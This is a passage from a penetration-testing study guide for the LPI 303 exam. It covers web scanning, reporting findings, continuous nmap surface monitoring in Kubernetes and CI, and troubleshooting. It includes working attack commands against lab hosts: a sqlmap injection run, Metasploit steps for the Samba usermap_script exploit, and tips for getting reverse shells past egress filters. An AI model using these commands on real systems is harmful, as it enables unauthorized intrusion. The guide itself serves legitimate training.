+ 7521 requests: 0 error(s) and 8 item(s) reported

# gobuster — content/endpoint discovery (feeds A01 access-control testing)
└─# gobuster dir -u http://172.30.0.40 -w /usr/share/wordlists/dirb/common.txt -q
/assets    (Status: 301) [Size: 179] [--> /assets/]
/ftp       (Status: 200) [Size: 11651]
/robots.txt (Status: 200) [Size: 28]
/rest      (Status: 500) [Size: 84]

# sqlmap — automated SQL injection (A03). --batch = non-interactive defaults.
└─# sqlmap -u "http://172.30.0.30/vulnerabilities/sqli/?id=1&Submit=Submit" \
           --cookie="PHPSESSID=abc; security=low" --batch --dbs
[*] starting @ 22:58:03
[INFO] GET parameter 'id' is 'MySQL >= 5.0 boolean-based blind' injectable
[INFO] the back-end DBMS is MySQL
available databases [2]:
[*] dvwa
[*] information_schema
```

**OWASP ZAP** and **Burp Suite** are the two named intercepting proxies — you configure the browser to route through the proxy, then passively map the app and run active scans against A01–A10. **`nuclei`** is the modern template-driven scanner widely used for A05/A06 at scale. Be able to name these and say what each does.

---

## 8. Reporting and the finding lifecycle

Everything you captured (`-oA` XML, msf loot, screenshots) exists to produce the deliverable. A finding is only credible if it is **reproducible and risk-scored**. Anchor severity to CVSS, not adjectives.

```yaml
# finding-0007.yaml — one entry in the technical findings deliverable
finding:
  id: F-0007
  title: "Unauthenticated RCE via Samba username map script (CVE-2007-2447)"
  attck: ["T1210 Exploitation of Remote Services"]
  severity:
    cvss_v3_1: 10.0
    vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
  affected: ["172.30.0.20:139"]
  evidence:
    scan: "scans/meta2_full.xml"
    exploit_module: "exploit/multi/samba/usermap_script"
    proof: "meterpreter getuid => root; hashdump captured"
  reproduction:
    - "nmap -p139 --script smb-os-discovery 172.30.0.20  # confirm Samba 3.0.20"
    - "msf: use exploit/multi/samba/usermap_script; set RHOSTS 172.30.0.20; exploit"
  business_impact: "Full root on host adjacent to cardholder segment; enables lateral pivot."
  remediation:
    - "Upgrade Samba to a supported release (>= current stable)."
    - "Remove the non-default 'username map script' smb.conf directive."
    - "Enforce egress filtering to block reverse-shell call-backs (see 334.3)."
  retest_status: open
```

---

## 9. Continuous attack-surface validation in production (infrastructure)

A once-a-year pentest cannot keep up with a platform that ships daily. The SRE/Platform pattern is to run the *safe, non-exploitative* portion of the discipline — authorized scanning — **continuously**, and diff the result against declared intent. Below, a Kubernetes `CronJob` performs a nightly `nmap` scan of an authorized in-scope range and writes artifacts to a `PVC`; a companion pipeline gate fails a merge if a new port appears that isn't in the approved allow-list.

```yaml
# attack-surface-scan.yaml — scheduled, authorized, safe-category-only monitoring
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: scan-artifacts
  namespace: security-scanning
spec:
  accessModes: ["ReadWriteOnce"]
  resources:
    requests:
      storage: 5Gi
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: scan-scope
  namespace: security-scanning
data:
  # Mirror of roe.yaml scope — the ONLY targets this job may touch.
  targets.txt: |
    203.0.113.0/28
    198.51.100.16/28
  # Declared, approved externally-reachable services. Anything else = drift alert.
  allowed-ports.txt: |
    203.0.113.10:443
    203.0.113.11:443
    198.51.100.20:22
---
apiVersion: batch/v1
kind: CronJob
metadata:
  name: attack-surface-scan
  namespace: security-scanning
spec:
  schedule: "0 3 * * *"            # 03:00 daily, inside the RoE window
  concurrencyPolicy: Forbid
  successfulJobsHistoryLimit: 7
  failedJobsHistoryLimit: 3
  jobTemplate:
    spec:
      backoffLimit: 1
      activeDeadlineSeconds: 3600
      template:
        spec:
          restartPolicy: Never
          securityContext:
            runAsNonRoot: false      # -sS needs raw sockets; scoped via capabilities
          containers:
            - name: nmap
              image: instrumentisto/nmap:7.94
              securityContext:
                allowPrivilegeEscalation: false
                capabilities:
                  drop: ["ALL"]
                  add: ["NET_RAW", "NET_ADMIN"]   # least privilege for scanning
              command: ["/bin/sh", "-c"]
              args:
                - |
                  set -euo pipefail
                  TS=$(date +%Y%m%dT%H%M%SZ)
                  OUT="/artifacts/${TS}"
                  mkdir -p "$OUT"
                  # SAFE categories only — never 'vuln'/'exploit'/'intrusive' unattended.
                  nmap -sS -sV --script "default,safe" \
                       --max-rate 500 -T2 \
                       -iL /scope/targets.txt \
                       -oA "${OUT}/surface"
                  # Emit machine-readable open-port list for the drift gate.
                  awk '/open/ && /\/tcp/ {gsub("/tcp","",$1); print h":"$1}' \
                      h="" "${OUT}/surface.gnmap" > "${OUT}/open-ports.txt" || true
                  echo "scan complete: ${OUT}"
              volumeMounts:
                - { name: artifacts, mountPath: /artifacts }
                - { name: scope,     mountPath: /scope, readOnly: true }
          volumes:
            - name: artifacts
              persistentVolumeClaim: { claimName: scan-artifacts }
            - name: scope
              configMap: { name: scan-scope }
```

The corresponding CI gate — a new externally-reachable port that isn't in `allowed-ports.txt` fails the build, turning "surface drift" into a caught regression rather than a next-year finding:

```yaml
# .gitlab-ci.yml (excerpt) — surface-drift gate
attack-surface-gate:
  stage: verify
  image: instrumentisto/nmap:7.94
  rules:
    - if: '$CI_PIPELINE_SOURCE == "schedule"'   # authorized, scheduled context only
  script:
    - |
      nmap -sS -sV --top-ports 200 --max-rate 500 -T2 \
           -iL scope/targets.txt -oG - \
        | awk '/Ports:/{for(i=1;i<=NF;i++) if($i ~ /open/) print}' \
        | sort > actual-open.txt
    - |
      # Fail if any observed open port is NOT in the approved allow-list.
      if comm -23 actual-open.txt <(sort scope/allowed-ports.txt) | grep -q .; then
        echo "❌ Attack-surface drift detected — undeclared open port(s):"
        comm -23 actual-open.txt <(sort scope/allowed-ports.txt)
        exit 1
      fi
      echo "✅ Observed surface matches declared allow-list."
```

This is the objective's phrase — "verify the effectiveness of network security measures" — operationalized: the intended `NetworkPolicy`/firewall state is expressed as `allowed-ports.txt`, and `nmap` continuously proves whether reality matches it.

---

## 10. The broader tool landscape (awareness)

The objective's "common penetration testing tools" list. Recognize each tool's phase and function.

| Phase | Tool | Function |
|---|---|---|
| Recon (passive) | `theHarvester`, `amass`, `recon-ng`, `whois`, `dnsrecon` | OSINT, subdomain/email/asset discovery |
| Scanning | `nmap`, `masscan`, `unicornscan` | Port/service discovery |
| Vuln assessment | OpenVAS/Greenbone, Nessus, `nuclei`, Nikto | Known-vulnerability detection |
| Web | Burp Suite, OWASP ZAP, `sqlmap`, `gobuster`/`ffuf`, `wfuzz`, `whatweb` | App-layer testing |
| Exploitation | Metasploit, `searchsploit`/Exploit-DB, `msfvenom` | Vulnerability exploitation & payloads |
| Password | `hydra`, `medusa`, `john`, `hashcat` | Online/offline credential attacks |
| Wireless | `aircrack-ng` suite | 802.11 testing |
| Sniffing/MITM | Wireshark, `tcpdump`, `ettercap`, `bettercap`, `responder` | Traffic capture, spoofing |
| Post-exploitation/C2 | Meterpreter, `mimikatz`, Empire, Cobalt Strike, Sliver | Persistence, lateral movement, C2 |

```bash
# searchsploit — offline Exploit-DB search; the low-tech complement to msf's `search`
└─# searchsploit vsftpd 2.3.4
--------------------------------------------------- ----------------------------
 Exploit Title                                     |  Path
--------------------------------------------------- ----------------------------
vsftpd 2.3.4 - Backdoor Command Execution          | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Meta..) | unix/remote/17491.rb
--------------------------------------------------- ----------------------------
```

---

## 11. Verification and failure diagnosis

The difference between a junior scanner-runner and an engineer is the ability to explain *why a result is what it is* and to distinguish a real control from an artifact of your own tooling.

### 11.1 "The scan says the host is down, but I know it's up"

A firewall dropped the ICMP/SYN discovery probes, so `nmap` skipped the port scan entirely.

```bash
# Symptom
└─# nmap 203.0.113.10
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.05 seconds

# Fix: skip discovery, scan anyway
└─# nmap -Pn 203.0.113.10
# Or discover with a probe the firewall permits (e.g. SYN to a likely-open port)
└─# nmap -PS443,80,22 203.0.113.10
```

### 11.2 "Everything is `filtered`" vs. "everything is `closed`"

- **All `filtered`** → a stateful firewall is dropping your probes (control working) **or** your rate is too high and packets are being lost (tooling artifact). Distinguish with `--reason` and by dropping to `-T2 --max-rate 100`.
- **All `closed`** → host is reachable and up, but there is **no packet filter** in front of it (RSTs are coming back). That is itself a finding.

```bash
# --reason exposes the evidence behind each state decision
└─# nmap -sS -p22,80,443 --reason 203.0.113.10
PORT    STATE    SERVICE  REASON
22/tcp  filtered ssh      no-response          <- firewall dropping (or lost packet)
80/tcp  closed   http     reset ttl 64         <- host replied RST: reachable, no filter
443/tcp open     https    syn-ack ttl 64       <- listening
```

### 11.3 SYN scan silently downgraded to connect scan

Running `-sS` without raw-socket privilege makes `nmap` fall back to `-sT`, which is slower and *logged by target applications*.

```bash
$ nmap -sS 172.30.0.20        # as non-root
You requested a scan type which requires root privileges.
QUITTING!

# Correct: grant only the capability needed, not full root
$ sudo setcap cap_net_raw,cap_net_admin+eip $(which nmap)
```

### 11.4 UDP scan reports mostly `open|filtered`

Expected. Closed UDP ports reply with ICMP port-unreachable, but hosts **rate-limit** ICMP (Linux default ~1/sec), so most ports never get a definitive answer and land in `open|filtered`. Confirm the few that matter with version probes and patience.

```bash
└─# nmap -sU -sV --version-intensity 0 -p53,123,161 172.30.0.20
PORT    STATE         SERVICE VERSION
53/udp  open          domain  ISC BIND 9.4.2
123/udp open|filtered ntp
161/udp open          snmp    SNMPv1 (public)     <- version probe forced a reply
```

Diagnose the packet-level reality with `--packet-trace` when a state is inexplicable:

```bash
└─# nmap -sU -p161 --packet-trace 172.30.0.20
SENT (0.02s) UDP 172.30.0.10:37645 > 172.30.0.20:161 ...
RCVD (0.03s) UDP 172.30.0.20:161 > 172.30.0.10:37645 ...   <- reply => open
```

### 11.5 Metasploit reverse shell never connects back

The most common exploitation-phase failure, in order of likelihood:

1. **Wrong `LHOST`.** In NAT'd/containerized setups the target must reach your *routable* IP, not `127.0.0.1` or a private address it can't route to. Verify with `ip addr` and a listener test (`ncat -lvnp 4444` on you, `ncat <LHOST> 4444` from the target).
2. **Egress firewall blocks `LPORT`.** Switch `LPORT` to 443/53 (commonly allowed outbound), or use a `bind_tcp` payload if egress is fully closed.
3. **Handler not running / stage mismatch.** For staged payloads the handler must be up *before* the exploit fires, and `set PAYLOAD` on the handler must match the payload the exploit delivered exactly. `windows/meterpreter/reverse_tcp` (staged) and `windows/meterpreter_reverse_tcp` (stageless) are **not** interchangeable.
4. **Architecture mismatch.** `x86` payload on an `x64` target (or vice versa) may crash the stager. Match `-sV`/`sysinfo` architecture.
5. **DB not connected.** `db_nmap`/`hosts`/loot silently no-op without PostgreSQL.

```bash
msf6 > db_status
[*] postgresql selected, no connection      # <- broken
# Fix:
└─# msfdb reinit && systemctl start postgresql
msf6 > db_connect -y /usr/share/metasploit-framework/config/database.yml
```

### 11.6 NSE script does nothing / errors

```bash
# Update the local script database after adding scripts
└─# nmap --script-updatedb
# Debug a script with --script-trace to see what it actually sent
└─# nmap -p445 --script smb-enum-shares --script-trace 172.30.0.20
```

### 11.7 Correlate your activity with the blue team

A pentest is also a live test of detection. Before concluding a control is bypassable, confirm whether your scan was *seen*. On the defensive side, the same event should light up the IDS from 334.2 — a `-sS` sweep triggers Suricata/Snort port-scan signatures. If your loud `-T4 -p-` produced **no** SOC alert, that silence is itself a high-severity finding (A09: Logging & Monitoring Failures) worth as much as any open port.

---

## 12. References

- LPI — Exam 303-300 Objectives (Topic 335.2, Penetration Testing): https://www.lpi.org/our-certifications/exam-303-objectives/
- Nmap Reference Guide (scan types, port states, timing): https://nmap.org/book/man.html
- Nmap — Port Scanning Techniques: https://nmap.org/book/man-port-scanning-techniques.html
- Nmap Scripting Engine (NSE) documentation: https://nmap.org/book/nse.html
- Ncat User's Guide: https://nmap.org/ncat/guide/
- Masscan documentation: https://github.com/robertdavidgraham/masscan
- Metasploit Framework documentation: https://docs.metasploit.com/
- Metasploit Unleashed (Offensive Security): https://www.offsec.com/metasploit-unleashed/
- msfvenom documentation: https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html
- OWASP Top 10 (2021): https://owasp.org/www-project-top-ten/
- OWASP Web Security Testing Guide (WSTG): https://owasp.org/www-project-web-security-testing-guide/
- OWASP ZAP: https://www.zaproxy.org/docs/
- Penetration Testing Execution Standard (PTES): http://www.pentest-standard.org/
- NIST SP 800-115 — Technical Guide to Information Security Testing and Assessment: https://csrc.nist.gov/pubs/sp/800/115/final
- OSSTMM (ISECOM): https://www.isecom.org/OSSTMM.3.pdf
- MITRE ATT&CK: https://attack.mitre.org/
- Nikto: https://github.com/sullo/nikto
- sqlmap: https://sqlmap.org/
- Nuclei (ProjectDiscovery): https://docs.projectdiscovery.io/tools/nuclei/overview
- CVE-2007-2447 (Samba username map script): https://nvd.nist.gov/vuln/detail/CVE-2007-2447
- CVE-2017-7494 (SambaCry): https://www.samba.org/samba/security/CVE-2017-7494.html
- FIRST — CVSS v3.1 Specification: https://www.first.org/cvss/v3-1/specification-document